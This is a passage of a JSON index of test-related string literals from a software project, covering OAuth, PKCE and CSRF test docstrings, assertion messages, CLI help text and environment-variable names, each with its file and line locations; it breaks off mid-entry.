    "OAuth Error Handling Tests - Business Impact\n\nRevenue Impact: $50K+ MRR Enterprise OAuth Reliability\n- Ensures robust OAuth error handling for Enterprise production deployments\n- Prevents OAuth failures that could block Enterprise customer authentication\n- Validates graceful error recovery and user experience during OAuth issues\n\nTechnical Excellence:\n- Invalid state handling: OAuth security validation and CSRF protection\n- Access denial scenarios: graceful user cancellation and error messaging\n- Token exchange failures: provider service failure recovery and error handling\n- User info failures: incomplete data handling and fallback mechanisms\n- Network resilience: timeout and connectivity error handling\n- Input validation: malformed request sanitization and security protection\n- Rate limiting: OAuth abuse prevention and service stability\n- CSRF protection: security compliance and attack prevention\n\nEnterprise Readiness:\n- Enterprise: Robust OAuth error handling for production Enterprise deployments\n- Security: CSRF protection and input validation for OAuth security compliance\n- Reliability: Network failure handling and service resilience for Enterprise SLA\n- User Experience: Graceful error handling and recovery for Enterprise users\n- Stability: Rate limiting and abuse prevention for OAuth service protection": {
      "value": "OAuth Error Handling Tests - Business Impact\n\nRevenue Impact: $50K+ MRR Enterprise OAuth Reliability\n- Ensures robust OAuth error handling for Enterprise production deployments\n- Prevents OAuth failures that could block Enterprise customer authentication\n- Validates graceful error recovery and user experience during OAuth issues\n\nTechnical Excellence:\n- Invalid state handling: OAuth security validation and CSRF protection\n- Access denial scenarios: graceful user cancellation and error messaging\n- Token exchange failures: provider service failure recovery and error handling\n- User info failures: incomplete data handling and fallback mechanisms\n- Network resilience: timeout and connectivity error handling\n- Input validation: malformed request sanitization and security protection\n- Rate limiting: OAuth abuse prevention and service stability\n- CSRF protection: security compliance and attack prevention\n\nEnterprise Readiness:\n- Enterprise: Robust OAuth error handling for production Enterprise deployments\n- Security: CSRF protection and input validation for OAuth security compliance\n- Reliability: Network failure handling and service resilience for Enterprise SLA\n- User Experience: Graceful error handling and recovery for Enterprise users\n- Stability: Rate limiting and abuse prevention for OAuth service protection",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:541"
      ]
    },
    "OAuth Error Handling Tests - OAuth error scenarios and edge case validation\n\nTests OAuth error handling scenarios including invalid state parameters, access denial,\ntoken exchange failures, and user information fetch failures for robust OAuth implementation.\n\nBusiness Value Justification (BVJ):\n- Segment: Enterprise | Goal: OAuth Reliability | Impact: $50K+ MRR\n- Ensures robust OAuth error handling for Enterprise production deployments\n- Prevents OAuth failures that could block Enterprise customer authentication\n- Validates graceful error recovery and user experience during OAuth issues\n\nTest Coverage:\n- OAuth invalid state parameter handling and security validation\n- OAuth access denial and user cancellation scenarios\n- OAuth token exchange failure handling and error recovery\n- OAuth user information fetch failure and fallback mechanisms\n- OAuth edge cases and malformed request handling": {
      "value": "OAuth Error Handling Tests - OAuth error scenarios and edge case validation\n\nTests OAuth error handling scenarios including invalid state parameters, access denial,\ntoken exchange failures, and user information fetch failures for robust OAuth implementation.\n\nBusiness Value Justification (BVJ):\n- Segment: Enterprise | Goal: OAuth Reliability | Impact: $50K+ MRR\n- Ensures robust OAuth error handling for Enterprise production deployments\n- Prevents OAuth failures that could block Enterprise customer authentication\n- Validates graceful error recovery and user experience during OAuth issues\n\nTest Coverage:\n- OAuth invalid state parameter handling and security validation\n- OAuth access denial and user cancellation scenarios\n- OAuth token exchange failure handling and error recovery\n- OAuth user information fetch failure and fallback mechanisms\n- OAuth edge cases and malformed request handling",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:1"
      ]
    },
    "OAuth Flow Tests for Auth Service (Synchronous)\nBasic testing of OAuth endpoints with TestClient": {
      "value": "OAuth Flow Tests for Auth Service (Synchronous)\nBasic testing of OAuth endpoints with TestClient",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_flows_sync.py:1"
      ]
    },
    "OAuth HMAC secret missing error not detected: '": {
      "value": "OAuth HMAC secret missing error not detected: '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:71"
      ]
    },
    "OAuth ID Token Validation Tests - Business Impact\n\nSecurity Foundation: External Authentication Integration\n- Ensures secure OAuth ID token validation for external authentication providers\n- Validates token expiration, issuer verification, and security compliance\n- Critical foundation for social login and external authentication flows\n\nTechnical Excellence:\n- Valid token acceptance: ensures legitimate OAuth providers can authenticate users\n- Security validation: prevents expired, malformed, or malicious token acceptance\n- Provider flexibility: supports multiple OAuth providers (Google, GitHub, Microsoft)\n- Edge case handling: robust validation of timing boundaries and malformed inputs\n- Issuer verification: prevents token replay attacks from unauthorized providers\n\nPlatform Security:\n- Foundation: Secure external authentication foundation for social login flows\n- Security: Comprehensive OAuth validation prevents authentication bypasses\n- Provider Support: Multi-provider compatibility for flexible authentication options\n- Timing Security: Proper token age and expiration validation prevents stale token usage\n- Error Handling: Robust malformed token handling prevents authentication service crashes": {
      "value": "OAuth ID Token Validation Tests - Business Impact\n\nSecurity Foundation: External Authentication Integration\n- Ensures secure OAuth ID token validation for external authentication providers\n- Validates token expiration, issuer verification, and security compliance\n- Critical foundation for social login and external authentication flows\n\nTechnical Excellence:\n- Valid token acceptance: ensures legitimate OAuth providers can authenticate users\n- Security validation: prevents expired, malformed, or malicious token acceptance\n- Provider flexibility: supports multiple OAuth providers (Google, GitHub, Microsoft)\n- Edge case handling: robust validation of timing boundaries and malformed inputs\n- Issuer verification: prevents token replay attacks from unauthorized providers\n\nPlatform Security:\n- Foundation: Secure external authentication foundation for social login flows\n- Security: Comprehensive OAuth validation prevents authentication bypasses\n- Provider Support: Multi-provider compatibility for flexible authentication options\n- Timing Security: Proper token age and expiration validation prevents stale token usage\n- Error Handling: Robust malformed token handling prevents authentication service crashes",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_oauth_id_token_validation.py:218"
      ]
    },
    "OAuth ID Token Validation Tests - Critical authentication infrastructure testing\n\nTests the validation of OAuth ID tokens from external providers (Google, GitHub, etc.).\nThis is a fundamental component missing test coverage for basic authentication flows.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Security | Goal: Auth Foundation | Impact: OAuth Integration\n- Ensures secure OAuth ID token validation for external authentication providers\n- Validates token expiration, issuer verification, and security compliance\n- Critical foundation for social login and external authentication flows\n\nTest Coverage:\n- Valid ID token validation with proper claims\n- Invalid ID token rejection (expired, malformed, wrong issuer)\n- Edge cases and error handling for malformed tokens\n- Security validation for token timing and structure": {
      "value": "OAuth ID Token Validation Tests - Critical authentication infrastructure testing\n\nTests the validation of OAuth ID tokens from external providers (Google, GitHub, etc.).\nThis is a fundamental component missing test coverage for basic authentication flows.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Security | Goal: Auth Foundation | Impact: OAuth Integration\n- Ensures secure OAuth ID token validation for external authentication providers\n- Validates token expiration, issuer verification, and security compliance\n- Critical foundation for social login and external authentication flows\n\nTest Coverage:\n- Valid ID token validation with proper claims\n- Invalid ID token rejection (expired, malformed, wrong issuer)\n- Edge cases and error handling for malformed tokens\n- Security validation for token timing and structure",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_oauth_id_token_validation.py:1"
      ]
    },
    "OAuth JWT Security Validator Tests\n\nTests for the JWTSecurityValidator class which provides critical security validations\nfor JWT tokens in OAuth flows, including algorithm security and token integrity checks.": {
      "value": "OAuth JWT Security Validator Tests\n\nTests for the JWTSecurityValidator class which provides critical security validations\nfor JWT tokens in OAuth flows, including algorithm security and token integrity checks.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:1"
      ]
    },
    "OAuth Login Endpoint": {
      "value": "OAuth Login Endpoint",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_deployment.py:127"
      ]
    },
    "OAuth PKCE (Proof Key for Code Exchange) Validation Tests\nTests for RFC 7636 compliance and security vulnerabilities\n\nBusiness Value Justification (BVJ):\n- Segment: All (Free, Early, Mid, Enterprise)\n- Business Goal: Security, Compliance, OAuth Standards\n- Value Impact: Prevents authorization code interception attacks\n- Strategic Impact: Critical for OAuth security compliance and user trust\n\nPKCE Security Coverage:\n- Valid PKCE challenge validation\n- Invalid challenge rejection\n- Timing attack resistance\n- Malformed input handling\n- Edge case security validation": {
      "value": "OAuth PKCE (Proof Key for Code Exchange) Validation Tests\nTests for RFC 7636 compliance and security vulnerabilities\n\nBusiness Value Justification (BVJ):\n- Segment: All (Free, Early, Mid, Enterprise)\n- Business Goal: Security, Compliance, OAuth Standards\n- Value Impact: Prevents authorization code interception attacks\n- Strategic Impact: Critical for OAuth security compliance and user trust\n\nPKCE Security Coverage:\n- Valid PKCE challenge validation\n- Invalid challenge rejection\n- Timing attack resistance\n- Malformed input handling\n- Edge case security validation",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_pkce_validation.py:1"
      ]
    },
    "OAuth State CSRF Vulnerability Integration Tests\nTests for critical OAuth state management security flaws\n\nBusiness Value Justification (BVJ):\n- Segment: All (Free, Early, Mid, Enterprise)\n- Business Goal: Security, Compliance, CSRF Prevention\n- Value Impact: Prevents OAuth hijacking and CSRF attacks\n- Strategic Impact: CRITICAL security vulnerability that could compromise user accounts\n\nCRITICAL SECURITY ISSUE IDENTIFIED:\nThe initiate_oauth_login endpoint generates state parameters but doesn't store them\nfor later validation, creating a major CSRF vulnerability.\n\nThis test will FAIL to expose the security gap.": {
      "value": "OAuth State CSRF Vulnerability Integration Tests\nTests for critical OAuth state management security flaws\n\nBusiness Value Justification (BVJ):\n- Segment: All (Free, Early, Mid, Enterprise)\n- Business Goal: Security, Compliance, CSRF Prevention\n- Value Impact: Prevents OAuth hijacking and CSRF attacks\n- Strategic Impact: CRITICAL security vulnerability that could compromise user accounts\n\nCRITICAL SECURITY ISSUE IDENTIFIED:\nThe initiate_oauth_login endpoint generates state parameters but doesn't store them\nfor later validation, creating a major CSRF vulnerability.\n\nThis test will FAIL to expose the security gap.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_state_csrf_vulnerability.py:1"
      ]
    },
    "OAuth State Parameter Security Tests\nTesting Level: Unit (L1)\nFocus: OAuth state parameter security implementation\n\nBusiness Value Justification (BVJ):\n- Segment: All (Free, Early, Mid, Enterprise) \n- Business Goal: Security, Compliance, Trust\n- Value Impact: Prevents CSRF attacks and OAuth hijacking\n- Strategic Impact: Critical for platform security compliance and user trust\n\nOAuth Basics Coverage:\n- State parameter generation (cryptographically secure)\n- State parameter validation (timing-safe comparison)\n- State parameter expiration handling\n- State parameter uniqueness enforcement\n- CSRF protection through state binding": {
      "value": "OAuth State Parameter Security Tests\nTesting Level: Unit (L1)\nFocus: OAuth state parameter security implementation\n\nBusiness Value Justification (BVJ):\n- Segment: All (Free, Early, Mid, Enterprise) \n- Business Goal: Security, Compliance, Trust\n- Value Impact: Prevents CSRF attacks and OAuth hijacking\n- Strategic Impact: Critical for platform security compliance and user trust\n\nOAuth Basics Coverage:\n- State parameter generation (cryptographically secure)\n- State parameter validation (timing-safe comparison)\n- State parameter expiration handling\n- State parameter uniqueness enforcement\n- CSRF protection through state binding",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_state_security.py:1"
      ]
    },
    "OAuth config for": {
      "value": "OAuth config for",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:142"
      ]
    },
    "OAuth flow tests": {
      "value": "OAuth flow tests",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:106"
      ]
    },
    "OAuth provider connectivity loss causing Auth Service to hang": {
      "value": "OAuth provider connectivity loss causing Auth Service to hang",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:412"
      ]
    },
    "OAuth provider connectivity loss not handled, got": {
      "value": "OAuth provider connectivity loss not handled, got",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:409"
      ]
    },
    "OAuth providers not yet implemented": {
      "value": "OAuth providers not yet implemented",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_service_integration_reliability.py:173"
      ]
    },
    "OAuth redirect URI contains dangerous character '": {
      "value": "OAuth redirect URI contains dangerous character '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:369"
      ]
    },
    "OAuth redirect URI should use HTTPS in staging:": {
      "value": "OAuth redirect URI should use HTTPS in staging:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:363"
      ]
    },
    "OAuth redirect URI validation test:": {
      "value": "OAuth redirect URI validation test:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:371"
      ]
    },
    "OAuth security import failed:": {
      "value": "OAuth security import failed:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_service_integration_reliability.py:69"
      ]
    },
    "OAuth validation errors for": {
      "value": "OAuth validation errors for",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:233"
      ]
    },
    "OAuthTokenFactory": {
      "value": "OAuthTokenFactory",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/__init__.py:18"
      ]
    },
    "OK": {
      "value": "OK",
      "category": "test_literals",
      "locations": [
        "scripts/test_config_loading.py:86",
        "scripts/test_verify_workflow_status_corrected.py:46"
      ]
    },
    "OK - Configured": {
      "value": "OK - Configured",
      "category": "test_literals",
      "locations": [
        "scripts/test_config_loading.py:95",
        "scripts/test_config_loading.py:96",
        "scripts/test_config_loading.py:105",
        "scripts/test_config_loading.py:106"
      ]
    },
    "OK: setup_test_path() at line": {
      "value": "OK: setup_test_path() at line",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_import_order.py:58"
      ]
    },
    "OPEN": {
      "value": "OPEN",
      "category": "test_literals",
      "locations": [
        "frontend/components/chat/ConnectionStatusIndicator.test.tsx:14",
        "frontend/components/chat/ConnectionStatusIndicator.test.tsx:18"
      ]
    },
    "OPENAI_API_KEY": {
      "value": "OPENAI_API_KEY",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:90",
        "scripts/test_backend.py:90"
      ]
    },
    "OPTIMIZED TEST EXECUTION RESULTS": {
      "value": "OPTIMIZED TEST EXECUTION RESULTS",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:325"
      ]
    },
    "OR": {
      "value": "OR",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:123",
        "auth_service/tests/test_security.py:177",
        "auth_service/tests/test_security.py:207",
        "auth_service/tests/test_security.py:615"
      ]
    },
    "OVERRIDE_TEST_ENV": {
      "value": "OVERRIDE_TEST_ENV",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:106"
      ]
    },
    "Only check files changed in git diff": {
      "value": "Only check files changed in git diff",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:261"
      ]
    },
    "Only client ID": {
      "value": "Only client ID",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:174"
      ]
    },
    "Only generate report, no fixes (SAFE, default)": {
      "value": "Only generate report, no fixes (SAFE, default)",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:930"
      ]
    },
    "Only one async attempt should succeed, got": {
      "value": "Only one async attempt should succeed, got",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:302"
      ]
    },
    "Only one concurrent attempt should succeed, got": {
      "value": "Only one concurrent attempt should succeed, got",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:114"
      ]
    },
    "Only run tests matching given mark expression": {
      "value": "Only run tests matching given mark expression",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:483"
      ]
    },
    "Only run tests matching the given keyword expression": {
      "value": "Only run tests matching the given keyword expression",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:482"
      ]
    },
    "Only run tests matching the given pattern": {
      "value": "Only run tests matching the given pattern",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:389"
      ]
    },
    "Open Cypress interactive runner": {
      "value": "Open Cypress interactive runner",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:395"
      ]
    },
    "Operation cancellation not handled properly": {
      "value": "Operation cancellation not handled properly",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:257"
      ]
    },
    "Operation cancelled. Good choice!": {
      "value": "Operation cancelled. Good choice!",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:958"
      ]
    },
    "Optimization level": {
      "value": "Optimization level",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:375"
      ]
    },
    "Optimization:": {
      "value": "Optimization:",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:425"
      ]
    },
    "Optimize": {
      "value": "Optimize",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:269"
      ]
    },
    "Optimize CPU-intensive operations": {
      "value": "Optimize CPU-intensive operations",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:388"
      ]
    },
    "Optimize database queries": {
      "value": "Optimize database queries",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:407"
      ]
    },
    "Optimized Backend Test Runner - 100x Productivity Gains": {
      "value": "Optimized Backend Test Runner - 100x Productivity Gains",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:362"
      ]
    },
    "Optimized Backend Test Runner - 100x Productivity Gains\n\nUltra-high performance test execution with intelligent parallelization,\nresource monitoring, caching, and fail-fast mechanisms for maximum efficiency.\n\nBusiness Value Justification (BVJ):\n- Segment: All customer segments (development infrastructure)\n- Business Goal: Achieve 100x faster test cycles for rapid deployment\n- Value Impact: Enables continuous deployment with sub-minute test execution\n- Revenue Impact: Accelerates time-to-market by 90%, reduces CI/CD costs by 80%\n\nUsage:\n    python scripts/test_backend_optimized.py --category unit\n    python scripts/test_backend_optimized.py --optimize-aggressive\n    python scripts/test_backend_optimized.py --benchmark": {
      "value": "Optimized Backend Test Runner - 100x Productivity Gains\n\nUltra-high performance test execution with intelligent parallelization,\nresource monitoring, caching, and fail-fast mechanisms for maximum efficiency.\n\nBusiness Value Justification (BVJ):\n- Segment: All customer segments (development infrastructure)\n- Business Goal: Achieve 100x faster test cycles for rapid deployment\n- Value Impact: Enables continuous deployment with sub-minute test execution\n- Revenue Impact: Accelerates time-to-market by 90%, reduces CI/CD costs by 80%\n\nUsage:\n    python scripts/test_backend_optimized.py --category unit\n    python scripts/test_backend_optimized.py --optimize-aggressive\n    python scripts/test_backend_optimized.py --benchmark",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:2"
      ]
    },
    "Optimized execution failed:": {
      "value": "Optimized execution failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:156"
      ]
    },
    "Optimizing function": {
      "value": "Optimizing function",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:445"
      ]
    },
    "Optional service failed": {
      "value": "Optional service failed",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:248"
      ]
    },
    "Options:": {
      "value": "Options:",
      "category": "test_literals",
      "locations": [
        "scripts/standardize_l3_test_names.py:300"
      ]
    },
    "Origin": {
      "value": "Origin",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1078",
        "auth_service/tests/test_security.py:364",
        "auth_service/tests/test_security.py:697",
        "scripts/test_auth_integration.py:108",
        "scripts/test_staging_env.py:105",
        "scripts/test_websocket_dev_mode.py:176"
      ]
    },
    "Original:": {
      "value": "Original:",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:162",
        "scripts/test_staging_migrations.py:202"
      ]
    },
    "Output GitHub Actions annotations": {
      "value": "Output GitHub Actions annotations",
      "category": "test_literals",
      "locations": [
        "scripts/ci/check_test_stubs.py:110"
      ]
    },
    "Output file for report": {
      "value": "Output file for report",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:360"
      ]
    },
    "Output file path": {
      "value": "Output file path",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:521"
      ]
    },
    "Output file path (default: print to console)": {
      "value": "Output file path (default: print to console)",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:385"
      ]
    },
    "Output file path for the report": {
      "value": "Output file path for the report",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:776"
      ]
    },
    "Output format": {
      "value": "Output format",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:778",
        "scripts/compliance/fake_test_scanner.py:387",
        "scripts/compliance/test_size_validator.py:520"
      ]
    },
    "Output results as JSON": {
      "value": "Output results as JSON",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_env.py:210",
        "scripts/test_staging_startup.py:290"
      ]
    },
    "Output:": {
      "value": "Output:",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:116"
      ]
    },
    "Overall Result:": {
      "value": "Overall Result:",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:401",
        "scripts/test_database_url_builder_comprehensive.py:352",
        "scripts/test_ssl_certificates_staging.py:309",
        "scripts/test_staging_migrations.py:329"
      ]
    },
    "Overall compliance rate:": {
      "value": "Overall compliance rate:",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_compliance.py:161"
      ]
    },
    "Overall:": {
      "value": "Overall:",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:209",
        "scripts/unified_test_runner.py:704"
      ]
    },
    "PASS": {
      "value": "PASS",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:203",
        "scripts/test_verify_workflow.py:36",
        "scripts/test_verify_workflow.py:48",
        "scripts/test_verify_workflow.py:71",
        "scripts/test_verify_workflow_status_corrected.py:57",
        "scripts/test_verify_workflow_status_corrected.py:201",
        "scripts/test_websocket_dev_mode.py:304"
      ]
    },
    "PASSED": {
      "value": "PASSED",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:229",
        "scripts/comprehensive_test_fixer.py:309",
        "scripts/comprehensive_test_fixer.py:327",
        "scripts/test_auth_database_sessions.py:368",
        "scripts/test_auth_database_sessions.py:386",
        "scripts/test_database_url_builder_comprehensive.py:320",
        "scripts/test_database_url_builder_comprehensive.py:337",
        "scripts/test_example_message_flow.py:157",
        "scripts/test_ssl_certificates_staging.py:276",
        "scripts/test_ssl_certificates_staging.py:294"
      ]
    },
    "PASSED (": {
      "value": "PASSED (",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:63"
      ]
    },
    "PASSWORD": {
      "value": "PASSWORD",
      "category": "test_literals",
      "locations": [
        "scripts/test_config_loading.py:49"
      ]
    },
    "PASSWORD_CHANGE": {
      "value": "PASSWORD_CHANGE",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:22",
        "auth_service/tests/factories/audit_factory.py:119"
      ]
    },
    "PASSWORD_RESET": {
      "value": "PASSWORD_RESET",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:23"
      ]
    },
    "PERFORMANCE SUMMARY": {
      "value": "PERFORMANCE SUMMARY",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:328"
      ]
    },
    "PERMISSION_GRANTED": {
      "value": "PERMISSION_GRANTED",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:31",
        "auth_service/tests/factories/audit_factory.py:208"
      ]
    },
    "PERMISSION_REVOKED": {
      "value": "PERMISSION_REVOKED",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:32"
      ]
    },
    "PHASE": {
      "value": "PHASE",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:295"
      ]
    },
    "PHASE 1: Fixing syntax errors...": {
      "value": "PHASE 1: Fixing syntax errors...",
      "category": "test_literals",
      "locations": [
        "scripts/fix_all_test_issues.py:220"
      ]
    },
    "PHASE 2: Fixing size violations...": {
      "value": "PHASE 2: Fixing size violations...",
      "category": "test_literals",
      "locations": [
        "scripts/fix_all_test_issues.py:248"
      ]
    },
    "PHASE 3: Final validation...": {
      "value": "PHASE 3: Final validation...",
      "category": "test_literals",
      "locations": [
        "scripts/fix_all_test_issues.py:271"
      ]
    },
    "PKCE challenge validation failed": {
      "value": "PKCE challenge validation failed",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_pkce_validation.py:62"
      ]
    },
    "PKCE validation crashed on None input:": {
      "value": "PKCE validation crashed on None input:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_pkce_validation.py:147"
      ]
    },
    "PKCE validation should be case sensitive": {
      "value": "PKCE validation should be case sensitive",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_pkce_validation.py:166"
      ]
    },
    "PKCE validation should fail for malformed challenges": {
      "value": "PKCE validation should fail for malformed challenges",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_pkce_validation.py:57"
      ]
    },
    "PKCE validation should fail gracefully with malformed input": {
      "value": "PKCE validation should fail gracefully with malformed input",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_pkce_token_refresh.py:115"
      ]
    },
    "PKCE validation should fail with empty verifier/challenge": {
      "value": "PKCE validation should fail with empty verifier/challenge",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_pkce_token_refresh.py:127"
      ]
    },
    "PKCE validation should fail with mismatched verifier/challenge": {
      "value": "PKCE validation should fail with mismatched verifier/challenge",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_pkce_token_refresh.py:74"
      ]
    },
    "PKCE validation should handle unicode input gracefully, not crash": {
      "value": "PKCE validation should handle unicode input gracefully, not crash",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_pkce_validation.py:132"
      ]
    },
    "PKCE validation should succeed with matching verifier/challenge": {
      "value": "PKCE validation should succeed with matching verifier/challenge",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_pkce_token_refresh.py:52"
      ]
    },
    "PORT": {
      "value": "PORT",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:42",
        "auth_service/tests/test_critical_staging_issues.py:125",
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:98"
      ]
    },
    "POST": {
      "value": "POST",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:380",
        "scripts/test_auth_integration.py:109",
        "scripts/test_staging_deployment.py:129"
      ]
    },
    "POSTGRES_DB": {
      "value": "POSTGRES_DB",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:36",
        "auth_service/test_staging_db_connection.py:41",
        "auth_service/test_staging_db_connection.py:126",
        "auth_service/test_staging_db_connection.py:126",
        "auth_service/test_url_construction.py:37",
        "auth_service/test_url_construction.py:65",
        "auth_service/test_url_construction.py:65",
        "auth_service/tests/test_critical_staging_database_failures.py:52",
        "auth_service/tests/test_critical_staging_database_failures.py:110",
        "auth_service/tests/test_critical_staging_database_failures.py:148"
      ]
    },
    "POSTGRES_HOST": {
      "value": "POSTGRES_HOST",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:34",
        "auth_service/test_staging_db_connection.py:39",
        "auth_service/test_staging_db_connection.py:124",
        "auth_service/test_staging_db_connection.py:124",
        "auth_service/test_staging_db_connection.py:231",
        "auth_service/test_staging_db_connection.py:240",
        "auth_service/test_url_construction.py:35",
        "auth_service/test_url_construction.py:63",
        "auth_service/test_url_construction.py:63",
        "auth_service/tests/database/test_config.py:105"
      ]
    },
    "POSTGRES_PASSWORD": {
      "value": "POSTGRES_PASSWORD",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:38",
        "auth_service/test_staging_db_connection.py:43",
        "auth_service/test_staging_db_connection.py:128",
        "auth_service/test_staging_db_connection.py:128",
        "auth_service/test_staging_db_connection.py:131",
        "auth_service/test_url_construction.py:39",
        "auth_service/test_url_construction.py:67",
        "auth_service/test_url_construction.py:67",
        "auth_service/test_url_construction.py:173",
        "auth_service/tests/database/test_config.py:108"
      ]
    },
    "POSTGRES_PORT": {
      "value": "POSTGRES_PORT",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:35",
        "auth_service/test_staging_db_connection.py:40",
        "auth_service/test_staging_db_connection.py:125",
        "auth_service/test_staging_db_connection.py:125",
        "auth_service/test_url_construction.py:36",
        "auth_service/test_url_construction.py:64",
        "auth_service/test_url_construction.py:64",
        "auth_service/tests/database/test_config.py:106",
        "auth_service/tests/database/test_config.py:118",
        "auth_service/tests/database/test_config.py:143"
      ]
    },
    "POSTGRES_SSLMODE": {
      "value": "POSTGRES_SSLMODE",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:252"
      ]
    },
    "POSTGRES_USER": {
      "value": "POSTGRES_USER",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:37",
        "auth_service/test_staging_db_connection.py:42",
        "auth_service/test_staging_db_connection.py:127",
        "auth_service/test_staging_db_connection.py:127",
        "auth_service/test_url_construction.py:38",
        "auth_service/test_url_construction.py:66",
        "auth_service/test_url_construction.py:66",
        "auth_service/test_url_construction.py:172",
        "auth_service/tests/database/test_config.py:107",
        "auth_service/tests/database/test_config.py:119"
      ]
    },
    "POSTGRES_db": {
      "value": "POSTGRES_db",
      "category": "test_literals",
      "locations": [
